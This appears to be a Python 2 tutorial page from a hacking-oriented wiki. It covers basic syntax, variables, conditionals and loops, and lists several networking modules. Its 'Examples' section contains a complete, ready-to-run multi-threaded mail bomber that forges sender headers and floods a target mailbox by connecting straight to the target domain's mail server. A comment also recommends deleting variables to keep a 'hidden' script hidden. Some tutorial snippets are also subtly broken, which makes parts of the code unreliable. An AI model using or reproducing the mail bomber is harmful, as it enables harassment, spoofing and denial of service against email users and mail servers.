Below applies to Python 2.6 or lower, Python 3 is a good bit different.
Python is an object oriented, interpreted language. It is unique in that it requires a user to indent in place of using curly brackets ({..}).
Note: that most *nix distributions come with Python by default.

## Basics ##

_Basic_ python syntax

### Hello World! ###

    >>> print "HELLO WORLD!"
    HELLO WORLD!

### Variables ###

Variable names DO NOT need to begin with a special character, unlike PHP. Variable names CAN, however, be any combination, as long as the word isn't reserved (Ex: and, or, print), of letters and numbers.
    >>> #Numbers
    >>> a = 1 #Declare A as 1
    >>> b = a+5 #b becomes 6, while a remains 1
    >>> a += 5 #a is overwritten, and becomes 6
    >>> c = b = a #c and b are overwritten and become 6
    >>> #Strings
    >>> a = "Hello "
    >>> b = "There"
    >>> c = a+b #JOIN STRINGS
    >>> a = "Blue Yellow Green Red".split(" ") #Split the string at every " "
    >>> a #Output 'a' to the screen, same as print or print()
    ['Blue', 'Yellow', 'Green', 'Red'] #List object, another type of variable
    >>> _.join(a) #Join all the list objects as one_
    'BlueYellowGreenRed'
    >>> a = 'Blue Green Yellow Red'[0:4] #This returns the sub-string 'Blue'
    >>> a = 'Blue Green Yellow Red'[5:] #This returns the sub-string 'Green Yellow Red'
    >>> a = 'a = 'Blue Green Yellow Red'[::2] #This returns the sub-string _Bu re elwRd'_
    >>> #Float 
    >>> a = 88.2
    >>> b = 88
    >>> print a/25
    3.528
    >>> print b/25
    3
    >>> #Other types
    >>> a = (" ", 355, 256.7, ["Hello", "World"])
    >>> type(a)
    <type 'tuple'>
    >>> a = {"Hello":"World", "Key":"Value"}
    >>> type(a)
    <type 'dict'>
    >>> a = "Anhero"
    >>> del a #Its a good idea, if you're making a 'hidden' script, to delete variables after you use them...

## Statements ##


### Comparison ###

<pre>
 <       Less than
 >       Greater than
 ==      Equal to
 !=      Not equal
 is      Identical
 is not  Not identical
 <=      Less than or equal to
 >=      Greater than or equal to
</pre>


#### If ####

    >>> a = 1
    >>> b = 2
    >>> if a != b:
    	print "No!"
     	
    No!
    >>> a = 1
    >>> b = 1
    >>> if a == b:
    	print "Yes!"
    	
    Yes!
    >>> a = 1
    >>> b = 5
    >>> if (a == b-len("....")/1) and "a" == "a" or "b" == "b":
    	print "Yes!"
     	
    Yes!

### Loops ###


#### While ####

    >>> a = 1
    >>> while a < 5: #Note, replacing '<' with '<=' allows it to reach 5, instead of stopping at 4
    	print a
    	a += 1;
	
    1
    2
    3
    4
    >>> a = False;
    >>> while a == False:
    	print "False"
    	a = True;
    	
    False

#### For ####

    >>> for x in range(0, 10):
    	print x
    	
    0
    1
    2
    3
    4
    5
    6
    7
    8
    9
_consider using xrange when dealing with larger lists, as it creates an iterator, rather than constructing the full list in memory_
    >>> for x in ['Hello', 'world', ',this', 'is', 'a', 'list']:
    	print x
    	
    Hello
    world
    ,this
    is
    a
    list

## Examples ##


### Multi-Threaded Mail Bomber ###
```python
    #CREATED BY: DUMP 
    #MULTI THREADING ALLOWS FOR A CLASS TO BE RUN MULTIPLE TIMES AT ONCE.
    #INCLUDES SMTP ENGINE, AND MAIL HEADER GEN. THAT FOLLOWS RFC STARDARDS
    import socket, datetime, time, threading;
    class MailGen():
        def Engine(self, To, From, Subject, Data):
            self.lf = "\r\n";
            return "From: \""+From.split("@")[0]+"\" <"+From+">"+self.lf+"Return-Path: "+From+self.lf+"Sender: "+From+self.lf+"Recieved: "+From.split("@") [1].capitalize()+":25"+self.lf+"To: \""+To.split("@")[0]+"\" <"+To+">"+self.lf+"Subject: "+Subject+self.lf+"Date:  "+datetime.datetime.now().strftime("%a, %d %d %Y %H:%S")+self.lf+self.lf+Data
    class MailBomb(threading.Thread):
        def __init__(self, To, From, Data):
            self.To = To;
            self.From = From;
            self.Data = Data;
            threading.Thread.__init__ ( self )
        def run(self):
            print "THREAD LAUNCHED";
            self.lf = "\r\n";
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
            self.connection.connect((self.To[self.To.index("@")+1:len(self.To)], 25));
            self.connection.send("HELO"+self.lf); self.connection.recv(1024);
            self.connection.send("MAIL FROM: "+self.From+self.lf); self.connection.recv(1024);
            self.connection.send("RCPT TO: "+self.To+self.lf); self.connection.recv(1024);
            self.connection.send("DATA"+self.lf); self.connection.recv(1024);
            for line in self.Data: self.connection.send(line);
            self.connection.send(self.lf+self.lf+"."+self.lf); self.connection.recv(1024);
            self.connection.send("QUIT"+self.lf); self.connection.close();
    address1 = raw_input("To E-mail: ");
    address2 = raw_input("From E-mail: ");
    data1 = raw_input("Subject: ");
    data2 = raw_input("Data: ");
    generator = MailGen();
    message = generator.Engine(address1, address2, data1, data2);
    multiply = int(raw_input("Amount Sent (0, 5, 10...): "));
    lists = [address1]*multiply;
    for a in range(0, multiply, 5):
        for b in range(a, a+5):
            MailBomb(lists[b], address2, message).start();
        time.sleep(.50);
```
## Modules ##


### Scapy ###

Scapy is a powerful, low-level, networking tool

### DPKT ###

fast, simple packet creation / parsing, with definitions for the basic TCP/IP protocols. 

### Twisted ###

[Twisted](http://twistedmatrix.com/trac/) is an event-driven networking engine written in Python and licensed under the MIT license.

### Tornado Web ###

[Tornado](http://www.tornadoweb.org/) is an open source version of the scalable, non-blocking web server and tools that power FriendFeed. The FriendFeed application is written using a web framework that looks a bit like web.py or Google's webapp, but with additional tools and optimizations to take advantage of the underlying non-blocking infrastructure.

## Links ##

[Python Documentation](http://docs.python.org/)
[Download Python](http://www.python.org/download/)

